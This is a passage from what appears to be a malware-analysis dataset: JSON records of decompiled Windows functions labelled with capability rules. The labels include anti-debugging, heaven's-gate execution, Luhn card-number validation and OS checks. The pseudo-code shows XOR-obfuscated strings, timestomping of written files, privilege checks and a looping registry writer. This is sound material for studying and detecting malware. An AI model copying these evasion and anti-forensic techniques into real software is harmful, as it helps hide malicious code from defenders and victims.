        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040dad5(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    ushort var_2bh;\n    uchar var_29h;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    uint var_8h;\n    \n    iVar3 = *0x41cd20;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    var_8h = 0x16;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._2_2_ = uVar7 % 0x16 + 1;\n    var_1eh = uVar6 % 0x3b + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    var_1ch = uVar7 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar7 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x31123817;\n    var_58h = 0x6556321a;\n    var_54h = 0x385b7355;\n    var_50h = 0x32563117;\n    var_4ch = 0x73426564;\n    var_48h._0_2_ = 0x384b;\n    var_48h._2_1_ = var_8h;\n    stack0xffffffb7 = 0x5d320731;\n    var_41h = 0x1735c65;\n    var_3dh = 0x2f315738;\n    var_39h = 0x5c655b32;\n    var_35h = 0x4b385673;\n    var_31h._0_1_ = 0x31;\n    stack0xffffffcd = 0x54654032;\n    var_2bh = 0x3273;\n    var_29h = 0x38;\n    var_18h = 0x31653832;\n    var_14h._0_1_ = 0x73;\n    var_31h._1_1_ = var_48h._2_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0xa5c1a3) {\n            var_8h = 5;\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.0040d97f();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1389
    },
    "0040dd0b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dd0b(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.0040d97f();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040dad5(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 431
    },
    "0040e60d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e60d(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.0040e545();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 288
    },
    "0040314d": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040314d(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.0040298e(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040482b();\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "0040e967": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.0040e967(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41cda8 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 177
    },
    "004038f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004038f7(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "0040e9ba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e9ba(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "00403950": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403950(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2dh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            stack0xffffffd0 = 0x41386700;\n            var_28h = 0x5713533e;\n            var_24h = 0x67325836;\n            var_20h = 0x533d4125;\n            var_1ch._0_2_ = 0x5767;\n            var_10h = 0x41576753;\n            var_ch._0_1_ = 0x58;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                if (iVar5 != 0xf27034) {\n                    var_8h = 5;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + piVar4)[&var_2dh + (1 - piVar4)];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_54h = 0x593f6300;\n            var_50h = 0x6327460f;\n            var_4ch = 0x46085927;\n            var_48h = 0x59356321;\n            var_44h = 0x63124635;\n            var_40h = 0x46195920;\n            var_3ch = 0x59316317;\n            var_38h = 0x6332461d;\n            var_34h._0_2_ = 0x591c;\n            var_10h = 6;\n            var_34h._2_1_ = 6;\n            stack0xffffffcb = 0x50632446;\n            var_2dh._0_1_ = 0x59;\n            var_18h = 0x59506353;\n            var_14h._0_2_ = 0x4669;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar5 != 0xea6a68) {\n                    *(iVar6 + piVar4) = *(&var_18h + iVar6 % var_10h) ^ (iVar6 + piVar4)[&var_54h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1134
    },
    "004070d8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004070d8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0x30161515;\n    var_58h = 0x1f345438;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_54h = 0x5626092c;\n    var_50h = 0x2b031534;\n    var_4ch = 0x2d1a4129;\n    var_48h = 0x5a2b2a19;\n    var_44h = 0x72c0931;\n    var_40h = 0x1f34473a;\n    var_3ch = 0x5019301e;\n    var_38h = 0x2b190934;\n    var_34h = 0x140f6921;\n    var_30h = 0x5b3d2104;\n    var_2ch = 0x17500e23;\n    var_28h = 0x1332412a;\n    var_24h = 0x693c231e;\n    var_20h = 0x211e151c;\n    var_1ch = 0x1e63693c;\n    var_18h._0_2_ = 0x442c;\n    var_8h = 0x44707a46;\n    var_4h._0_2_ = 0x354f;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_ch = 6;\n    iVar5 = 0;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar2 != 0x1fe89e) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_8h = 0x4a615a48;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x75);\n    var_14h = 0x7a516f7a;\n    var_10h._0_2_ = 0x5275;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_64h = &var_8h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar2 = var_68h;\n        if (iVar3 != 0x16ccb4) {\n            *(iVar5 + iVar4) = *(&var_14h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_8h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1224
    },
    "0040e6ed": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040e6ed(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    *0x41cdb4 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41cda8 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41cd98 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.004073b6();\n    fcn.0040e684();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41cdd0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (*0x41cdd0 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41cdd0, &nSize);\n        if (iVar4 == 0) {\n            var_24h = 0x44373633;\n            var_20h = 0x36284a1e;\n            var_1ch = 0x4a024436;\n            var_18h._0_2_ = 0x3666;\n            pIdentifierAuthority = 0x44793666;\n            var_ch._0_2_ = 0x4a55;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                if (iVar5 != 0xef9da7) {\n                    cbSid = 6;\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % 6) ^ (iVar6 + iVar4)[&var_24h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41cdd0, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.0040e310();\n    }\n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41cda8 < 6) {\n                return 0;\n            }\n            fcn.0040e967();\n            goto code_r0x0040e87e;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x0040e87e:\n    if (5 < *0x41cda8) {\n        fcn.0040e897();\n    }\n    return 0;\n}\n",
        "token_count": 995
    },
    "00404c1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00404c1f(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_30h = 0x2116122d;\n    var_2ch = 0x31500233;\n    var_28h = 0x51272133;\n    var_24h._0_2_ = 0x1217;\n    var_24h._2_1_ = 0x41;\n    var_20h = 0x4e416164;\n    var_1ch._0_2_ = 0x3444;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_10h = &var_30h - iVar4;\n    var_14h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0x1b4457) {\n            var_ch = 6;\n            *(iVar7 + iVar4) = *(&var_20h + iVar7 % 6) ^ (iVar7 + iVar4)[var_10h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_30h = 0x5c11271a;\n    var_2ch = 0x51711d37;\n    var_28h = 0x2e1d361c;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 99);\n    var_ch = 0x32634271;\n    var_8h._0_1_ = 0x52;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_10h = &var_30h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        iVar5 = var_14h;\n        if (iVar6 != 0x8e2b06) {\n            var_10h = 5;\n            *(iVar7 + iVar4) = *(&var_ch + iVar7 % 5) ^ (iVar7 + iVar4)[&var_30h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_14h);\n    *0x41d1f0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41d1f0 != NULL) {\n        iVar7 = (**0x41d1f0)(var_18h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 948
    },
    "004085e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004085e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040849d(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.00407a57(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00401b2b(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 579
    },
    "00404e4e": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404e4e(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    int32_t var_13ch;\n    uint var_138h;\n    int32_t var_134h;\n    uint var_130h;\n    int32_t var_12ch;\n    uint var_128h;\n    int32_t var_124h;\n    uint var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    int32_t var_fch;\n    uint var_f8h;\n    int32_t var_f4h;\n    uint var_f0h;\n    int32_t var_ech;\n    uint var_e8h;\n    int32_t var_e4h;\n    uint var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    ushort var_1ch;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h._0_1_ = 0x26;\n    var_18h._1_1_ = 0x10;\n    var_18h._2_1_ = 0x75;\n    var_18h._3_1_ = 0x46;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 0x14;\n    var_14h._2_1_ = 1;\n    var_14h._3_1_ = 0x10;\n    var_10h._0_1_ = 0x62;\n    var_10h._1_1_ = 0x5b;\n    var_10h._2_1_ = 0x3e;\n    var_10h._3_1_ = 0x10;\n    var_ch._0_1_ = 0x1b;\n    var_ch._1_1_ = 0x25;\n    var_ch._2_1_ = 0x44;\n    var_ch._3_1_ = 0x5d;\n    var_8h._0_1_ = 